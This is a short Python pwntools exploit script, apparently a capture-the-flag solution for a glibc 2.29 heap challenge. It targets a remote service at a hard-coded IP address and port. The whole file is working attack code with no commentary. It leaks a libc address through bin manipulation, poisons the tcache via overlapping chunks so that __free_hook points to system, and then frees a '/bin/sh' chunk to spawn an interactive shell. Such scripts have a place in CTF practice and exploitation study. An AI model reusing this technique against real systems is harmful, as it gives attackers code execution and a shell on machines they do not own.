from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def new(idx,content):
	menu(1)
	p.sendlineafter('index?',str(idx))
	p.sendafter('name?',content)
def free(index):
	menu(2)
	p.sendlineafter('index?',str(index))
def show(index):
	menu(3)
	p.sendlineafter('index?',str(index))
def gift(index):
	menu(5)
	p.sendlineafter('steal?',str(index))
p = process('./main')
p = remote('8.131.69.237',32452)
libc =ELF('./libc-2.29.so')
for i in range(9):
	new(i,'FMYY')
for i in range(9):
	free(8 - i)
for i in range(7):
	new(i,'FMYY')
new(7,'\xF0')
show(7)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x1C0 - 0x100
log.info('LIBC:\t' + hex(libc_base))
new(8,'FMYY')

for i in range(7):
	free(6 - i)
free(7)
gift(8)
for i in range(7):
	new(i,'FMYY')
menu(6)
new(7,'\x00'*0xD0 + p64(0) + p64(0x111) + '\x00'*0x20)
free(6)
free(8)
free(7)
new(7,'\x00'*0xD0 + p64(0) + p64(0x111) + p64(libc_base + libc.sym['__free_hook']))
new(8,'/bin/sh\x00')
new(6,p64(libc_base + libc.sym['system']))
free(8)
p.interactive()
